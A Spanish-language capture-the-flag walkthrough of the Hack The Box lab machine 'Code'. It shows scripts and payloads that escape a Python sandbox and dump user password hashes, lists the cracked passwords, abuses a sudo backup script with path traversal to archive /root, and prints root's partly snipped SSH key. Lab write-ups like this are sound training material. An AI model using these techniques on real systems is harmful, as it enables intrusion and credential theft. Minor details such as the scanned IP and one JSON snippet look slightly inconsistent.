
# Code

<figure><img src="/files/o4UIFtWDLRwCsaB8kDiT" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Primer acceso</mark>

Añadimos la IP `10.10.11.62` a nuestro `/etc/hosts` y accedemos través del navegador.

```bash
sudo echo "10.10.11.62 code.htb" | sudo tee -a /etc/hosts
```

No tiene el puerto 80 expuesto, por lo que haremos un escaneo de puertos.

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -sCV -T5 10.10.11.11
```

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
```

Solo encontramos 2 puertos abiertos, el 22 y el 5000, que rápidamente nos llama la atención. Al acceder nos encontramos con una especie de editor/ejecutor de código desde el navegador:

<figure><img src="/files/5UPnJQN6jGUouXpzX88l" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Fuzzing</mark>

Haciendo fuzzing con dirsearch nos encontramos unos pocos directorios:

```bash
dirsearch -u http://10.10.11.62:5000/ -x 300,301,302,400,403,404,503 

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Escritorio/machines/htb/environment/reports/http_10.10.11.62_5000/__25-05-04_21-14-42.txt

Target: http://10.10.11.62:5000/

[21:14:42] Starting: 
[21:14:49] 200 -  818B  - /about
[21:15:09] 200 -  730B  - /login
[21:15:16] 200 -  741B  - /register

Task Completed
```

Tiene una página de login y registro, por lo que nos registraremos para ver el interior de la aplicación:

<figure><img src="/files/PoMY95QARinDobTlOj4S" alt=""><figcaption></figcaption></figure>

Lo único que activa esto es un apartado de `My Codes`, que sirve para guardar el código que escribamos. Al intentar un payload básico en python para ejecutar un comando de sistema como id:

```python
import os
os.system("id")
```

Vemos que nos da el error:

```
Use of restricted keywords is not allowed.
```

Al intentar ejecutar una reverse shell nos da el mismo error.

<figure><img src="/files/VCO8zVDeLCg3NjJtKfK8" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Encontrar keywords restringidas</mark>

* El endpoint `POST /run_code` es el responsable de ejecutar código Python.
* El filtro de "restricted keywords" **no está en el frontend** (no hay ninguna validación JS), por lo que e**l filtrado ocurre en el backend**, probablemente usando expresiones regulares o listas negras.

Vamos a usar el siguiente script en python para encontrar las keywords restringidas en el endpoint:

```python
import requests
import keyword
import builtins

# Configuración del endpoint
url = "http://10.10.11.62:5000/run_code"
session = requests.Session()  # Agrega autenticación si es necesario

# Palabras clave del lenguaje
python_keywords = keyword.kwlist

# Funciones incorporadas (builtins)
builtin_funcs = dir(builtins)

# Módulos y funciones potencialmente peligrosas
suspicious_items = [
    "os", "sys", "subprocess", "pickle", "marshal", "base64", "shutil", "__import__", "__builtins__"
]

# Combinamos todas las palabras a probar
keywords_to_test = sorted(set(python_keywords + builtin_funcs + suspicious_items))

# Testeo
print(f"[+] Testing {len(keywords_to_test)} Python identifiers...\n")

for kw in keywords_to_test:
    payload = f"{kw}  # test"
    try:
        r = session.post(url, data={"code": payload}, timeout=5)
        if "restricted" in r.text.lower():
            print(f"❌ BLOCKED: {kw}")
        else:
            print(f"✅ ALLOWED: {kw}")
    except Exception as e:
        print(f"⚠️ ERROR testing {kw}: {e}")
```

Al ejecutarlo nos muestra todas las keywords permitidas:

```bash
python3 check.py | grep BLOCKED

❌ BLOCKED: ImportError
❌ BLOCKED: ImportWarning
❌ BLOCKED: OSError
❌ BLOCKED: SystemError
❌ BLOCKED: SystemExit
❌ BLOCKED: __builtins__
❌ BLOCKED: __import__
❌ BLOCKED: eval
❌ BLOCKED: exec
❌ BLOCKED: import
❌ BLOCKED: open
❌ BLOCKED: os
❌ BLOCKED: subprocess
```

El filtrado está bloqueando no solo funciones/módulos peligrosos, sino también **nombres relacionados con excepciones del sistema**, lo cual sugiere que podrían estar evaluando la entrada con una expresión regular muy general o una lista negra más profunda de lo habitual.

## <mark style="color:purple;">Bypass Python Sandboxes</mark>

Buscando en Hacktricks encontramos un artículo interesante sobre Bypass Python Sandboxes que podemos utilizar:

{% embed url="<https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html?highlight=bypass%20python%20san#bypass-pickle-sandbox-with-the-default-installed-python-packages>" %}

Podemos usar el manejo de excepciones para interactuar con la memoria de la aplicación usando:

```python
raise Exception(globals())
```

Y nos devuelve lo siguiente, confirmando que existen clases como `User` y objetos de `SQLAlchemy` (`db`) en la aplicación Flask. Esto indica que **la aplicación carga modelos de la base de datos en memoria**.

{% code overflow="wrap" %}

```
Register Login About
{'__name__': 'app', '__doc__': None, '__package__': '', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f6bc8dcc400>, '__spec__': ModuleSpec(name='app', loader=<_frozen_importlib_external.SourceFileLoader object at <---SNIP--->
'request': <Request 'http://10.10.11.62:5000/run_code' [POST]>, 'jsonify': <function jsonify at 0x7f6bc8a34c10>, 'redirect': <function redirect at 0x7f6bc889d3a0>, 'url_for': <function url_for at 0x7f6bc889d310>, 'session': <SecureCookieSession {}>, 'flash': <function flash at 0x7f6bc889d550>, 'SQLAlchemy': <class 'flask_sqlalchemy.extension.SQLAlchemy'>, 'sys': <module 'sys' (built-in)>, 'io': <module 'io' from '/usr/lib/python3.8/io.py'>, 'os': <module 'os' from '/usr/lib/python3.8/os.py'>, 'hashlib': <module 'hashlib' from '/usr/lib/python3.8/hashlib.py'>, 'app': <Flask 'app'>, 'db': <SQLAlchemy sqlite:////home/app-production/app/instance/database.db>, 'User': <class 'app.User'>, 'Code': <class 'app.Code'>, 'index': <function index at 0x7f6bc77d78b0>, 'register': <function register at 0x7f6bc77d7b80>, 'login': <function login at 0x7f6bc77d7c10>, ...
```

{% endcode %}

Esto significó que desde aquí podía consultar la memoria de la aplicación para extraer datos confidenciales, incluso sin necesidad de acceso directo ni importaciones.

## <mark style="color:purple;">**Extraer Credenciales de Usuarios**</mark>

Ejecutamos una consulta directa a la tabla `User` usando `SQLAlchemy`:

```python
# Payload para extraer usuarios
raise Exception(User.query.all())
```

Eso nos devuelve:

```python
[<User 1>, <User 2>]
```

Usando el siguiente payload extraemos las credenciales del primer usuario:

{% code overflow="wrap" %}

```python
user1 = User.query.all()[0]
raise Exception(user1.__dict__)

# Nos devuelve
{'_sa_instance_state': <sqlalchemy.orm.state.InstanceState object at 0x7fc1c407f7c0>, 'id': 1, 'username': 'development', 'password': '759b74ce43947f5f4c91aeddc3e5bad3'}
```

{% endcode %}

Y con el siguiente payload extraemos las credenciales del segundo usuario:

{% code overflow="wrap" %}

```python
user2 = User.query.all()[1]
raise Exception(user2.__dict__)

# Nos devuelve

{'_sa_instance_state': <sqlalchemy.orm.state.InstanceState object at 0x7fdebfa70220>, 'id': 2, 'username': 'martin', 'password': '3de6f30c4a09c27fc71932bfc68474be'}
```

{% endcode %}

Tenemos 2 usuarios y 2 hashes, que probaremos a crackear con [Crackstation](https://crackstation.net/):

<table><thead><tr><th width="346">Hash</th><th width="100">Tipo</th><th>Resultado</th></tr></thead><tbody><tr><td>759b74ce43947f5f4c91aeddc3e5bad3</td><td>md5</td><td>development</td></tr><tr><td>3de6f30c4a09c27fc71932bfc68474be</td><td>md5</td><td>nafeelswordsmaster</td></tr></tbody></table>

Bingo! Tenemos credenciales de 2 usuarios:

```
development:development
martin:nafeelswordsmaster
```

## <mark style="color:purple;">Acceso por SSH</mark>

Intentamos acceder con `development`, pero solo podemos acceder con el usuario `martin`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ ssh martin@10.10.11.62
</strong>
martin@10.10.11.62's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue 06 May 2025 10:42:04 PM UTC
 
Last login: Tue May 6 22:42:05 2025 from 10.10.14.198
martin@code:~$ 
</code></pre>

Al acceder encontramos un directorio `backups` con un archivo interesante:

```shell-session
martin@code:~$ ls
backups
martin@code:~$ cd backups/
martin@code:~/backups$ ls
task.json
martin@code:~/backups$ cat task.json 
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/app-production/app"
	],

	"exclude": [
		".*"
	]
}
```

**`task.json`**

* Configuración de un script de backup que archiva `/home/app-production/app`.

## <mark style="color:purple;">Escalada de privilegios</mark>

En el directorio `/home/martin` no está la flag, y no tenemos las credenciales de la otra home de `app-production`. Vamos a ver los permisos de ejecución que tenemos en la máquina:

```shell-session
martin@code:~$ sudo -l

Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

```bash
martin@code:~$ bash backy.sh
Usage: backy.sh <task.json>
```

Vemos que tenemos permisos de ejecución del script en bash `backy.sh` y que funciona pasándole como argumento el `task.json` que nos encontramos en el directorio `/backups`, vamos a echarle un vistazo al script:

```bash
martin@code:~/backups$ cat /usr/bin/backy.sh

#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

El script lee un archivo JSON, lo filtra con `jq` para sanitizar un Directory Traversal `../` y luego lo envía a `/usr/bin/backy`.

```bash
jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))'
```

#### Generar un json fake apuntando a /root

```bash
echo '{
  "directories_to_archive": ["/home/....//root]",
  "destination": "/home/martin"
}' > root.json
```

Este JSON es válido y pasará el filtro de `jq`, ya que:

* `/home/....//root` **empieza por `/home/`**, así que pasa el filtro de `is_allowed_path`.
* El traversal (`....//`) puede resolverse por el sistema de archivos a `/root` si el programa no aplica una resolución estricta del path.

Ahora ejecutamos `backy.sh` pasándole el json:

```shell-session
martin@code:~$ sudo /usr/bin/backy.sh root.json

2025/05/07 00:07:12 🍀 backy 1.2
2025/05/07 00:07:12 📋 Working with root.json ...
2025/05/07 00:07:12 💤 Nothing to sync
2025/05/07 00:07:12 📤 Archiving: [/home/../root]
2025/05/07 00:07:12 📥 To: /home/martin ...
2025/05/07 00:07:12 📦

martin@code:~$ ls
backups  code_home_.._root_2025_May.tar.bz2
```

Extraemos el tar en `/tmp`:

```shell-session
martin@code:~$ tar -xvjf code_home_.._root_2025_May.tar.bz2 -C /tmp

root/
root/.local/
root/.local/share/
root/.local/share/nano/
root/.local/share/nano/search_history
root/.selected_editor
root/.sqlite_history
root/.profile
root/scripts/
root/scripts/cleanup.sh
root/scripts/backups/
root/scripts/backups/task.json
root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
root/scripts/database.db
root/scripts/cleanup2.sh
root/.python_history
root/root.txt
root/.cache/
root/.cache/motd.legal-displayed
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
root/.bash_history
root/.bashrc
```

## <mark style="color:purple;">Root flag</mark>

```shell-session
martin@code:~$ cd /tmp
martin@code:/tmp$ ls
root

martin@code:/tmp$ cd root
martin@code:/tmp/root$ ls
root.txt  scripts

martin@code:/tmp/root$ cat root.txt 
1ac2ec8f8f3e9be271483b7d***********
```

## <mark style="color:purple;">Persistencia root</mark>

Vamos a extraer la clave `id_rsa` de root para acceder sin contraseña y así hacernos con la user flag:

```shell-session
martin@code:/tmp/root$ ls -la

total 40
drwx------ 6 martin martin 4096 May  6 19:44 .
drwxrwxrwt 3 root   root   4096 May  7 00:10 ..
lrwxrwxrwx 1 martin martin    9 Jul 27  2024 .bash_history -> /dev/null
-rw-r--r-- 1 martin martin 3106 Dec  5  2019 .bashrc
drwx------ 2 martin martin 4096 Aug 27  2024 .cache
drwxr-xr-x 3 martin martin 4096 Jul 27  2024 .local
-rw-r--r-- 1 martin martin  161 Dec  5  2019 .profile
lrwxrwxrwx 1 martin martin    9 Jul 27  2024 .python_history -> /dev/null
-rw-r----- 1 martin martin   33 May  6 19:44 root.txt
drwxr-xr-x 3 martin martin 4096 Apr  9 11:26 scripts
-rw-r--r-- 1 martin martin   66 Apr  9 11:27 .selected_editor
lrwxrwxrwx 1 martin martin    9 Jul 27  2024 .sqlite_history -> /dev/null
drwx------ 2 martin martin 4096 Aug 27  2024 .ssh
```

```shell-session
martin@code:/tmp/root$ cd .ssh
martin@code:/tmp/root/.ssh$ ls
authorized_keys  id_rsa
martin@code:/tmp/root/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvxPw90VRJajgkjwxZqXr865V8He/HNHVlhp0CP36OsKSi0DzIZ4K
sqfjTi/WARcxLTe4lkVSVIV25Ly5M6EemWeOKA6vdONP0QUv6F1xj8f4eChrdp7BOhRe0+
zWJna8dYMtuR2K0Cxbdd+qvM7oQLPRelQIyxoR4unh6wOoIf4EL34aEvQDux+3GsFUnT4Y
MNljAsxyVFn3mzR7nUZ8BAH/Y9xV/KuNSPD4SlVqBiUjUKfs2wD3gjLA4ZQZeM5hAJSmVe
ZjpfkQOdE+++H8t2P8qGlobLvboZJ2rghY9CwimX0/g0uHvcpXAc6U8JJqo9U41WzooAi6
TWxWYbdO3mjJhm0sunCio5xTtc44M0nbhkRQBliPngaBYleKdvtGicPJb1LtjtE5lHpy+N
Ps1B4EIx+ZlBVaFbIaqxpqDVDUCv0qpaxIKhx/lKmwXiWEQIie0fXorLDqsjL75M7tY/u/
<---SNIP--->
-----END OPENSSH PRIVATE KEY-----
```

Guardamos el `id_rsa` en un archivo en nuestro Kali Linux y le damos permisos limitados con `chmod 600`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ chmod 600 root_id_rsa
</strong>
afsh4ck@kali$ ssh -i root_id_rsa root@10.10.11.62

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 07 May 2025 12:18:11 AM UTC
 Last login: Wed May 7 00:18:11 2025 from 10.10.14.19
 
root@code:~#   
</code></pre>

## <mark style="color:purple;">User flag</mark>

```shell-session
root@code:/# cd /home
root@code:/home# ls
app-production  martin

root@code:/home# cd app-production/
root@code:/home/app-production# ls
app  user.txt
    
root@code:/home/app-production# cat user.txt 
914503d998a0f92fd79567***********
```
